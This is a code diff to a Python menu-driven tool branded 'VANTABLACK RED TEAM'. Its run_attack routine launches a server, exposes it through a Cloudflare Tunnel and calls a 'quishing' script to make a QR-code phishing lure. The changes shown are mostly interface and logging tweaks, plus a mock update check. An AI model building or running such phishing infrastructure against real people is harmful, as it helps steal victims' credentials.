@@ -70,8 +70,10 @@ def run_attack(target):
     server_process = subprocess.Popen(
         server_cmd,
         stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True
+        stderr=subprocess.STDOUT,
+        text=True,
+        bufsize=1,
+        universal_newlines=True
     )
     
     # Start Cloudflare Tunnel
@@ -109,7 +111,8 @@ def run_attack(target):
                 sys.executable, "quishing.py", 
                 "--url", tunnel_url, 
                 "--out", qr_out,
-                "--logo", logo_path
+                "--logo", logo_path,
+                "--lang", i18n.lang
             ])
             console.print(t("qr_generated", path=os.path.abspath(qr_out)))
         else:
@@ -117,7 +120,8 @@ def run_attack(target):
             subprocess.run([
                 sys.executable, "quishing.py", 
                 "--url", tunnel_url, 
-                "--out", qr_out
+                "--out", qr_out,
+                "--lang", i18n.lang
             ])
             
         console.print(t("stop_attack_msg"))
@@ -125,18 +129,16 @@ def run_attack(target):
         # Keep alive and stream logs
         try:
             while True:
-                # Check if server is still running
-                if server_process.poll() is not None:
-                    console.print(t("server_died"))
-                    # Print stderr to see why
-                    print(server_process.stderr.read())
-                    break
-                    
                 # Read server output
-                line = server_process.stderr.readline()
+                line = server_process.stdout.readline()
                 if line:
                     print(line.strip())
-                time.sleep(0.1)
+                
+                if server_process.poll() is not None:
+                    console.print(t("server_died"))
+                    break
+                    
+                time.sleep(0.01)
         except KeyboardInterrupt:
             console.print(t("stopping_attack"))
             server_process.terminate()
@@ -150,7 +152,8 @@ def run_attack(target):
 def settings_menu():
     global STEALTH_MODE, GEO_MODE
     while True:
-        console.print("\n" + t("settings_menu"))
+        clear_screen()
+        console.print(Panel.fit(t("settings_menu"), style="bold cyan"))
         console.print(t("setting_lang"))
         console.print(t("setting_stealth"))
         console.print(t("setting_geo"))
@@ -176,15 +179,29 @@ def settings_menu():
         elif choice == "4":
             break
 
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def check_updates():
+    clear_screen()
+    console.print(Panel.fit(t("checking_updates"), style="bold blue"))
+    time.sleep(1)
+    console.print(t("connecting_server"))
+    time.sleep(1.5)
+    console.print(t("updates_not_found"))
+    Prompt.ask(t("press_enter"))
+
 def main_menu():
     while True:
-        console.print("\n" + Panel.fit("VANTABLACK RED TEAM", style="bold purple"))
+        clear_screen()
+        console.print(Panel.fit("VANTABLACK RED TEAM", style="bold purple", subtitle="v2.1 - Live Operation"))
         console.print(t("menu_options"))
         console.print(t("option_attack"))
         console.print(t("option_settings"))
+        console.print(t("option_updates"))
         console.print(t("option_exit"))
         
-        choice = Prompt.ask(t("enter_number"), choices=["1", "2", "3"], default="1")
+        choice = Prompt.ask(t("enter_number"), choices=["1", "2", "3", "4"], default="1")
         
         if choice == "1":
             console.print(t("select_target"))
@@ -197,6 +214,8 @@ def main_menu():
         elif choice == "2":
             settings_menu()
         elif choice == "3":
+            check_updates()
+        elif choice == "4":
             sys.exit(0)
 
 if __name__ == "__main__":
@@ -215,6 +234,8 @@ if __name__ == "__main__":
         run_attack(args.target)
     else:
         # Initial Language Selection if not set
+        clear_screen()
+        console.print(Panel.fit("VANTABLACK INITIALIZATION", style="bold blue"))
         console.print(t("language_selection"))
         console.print(t("lang_en"))
         console.print(t("lang_fr"))
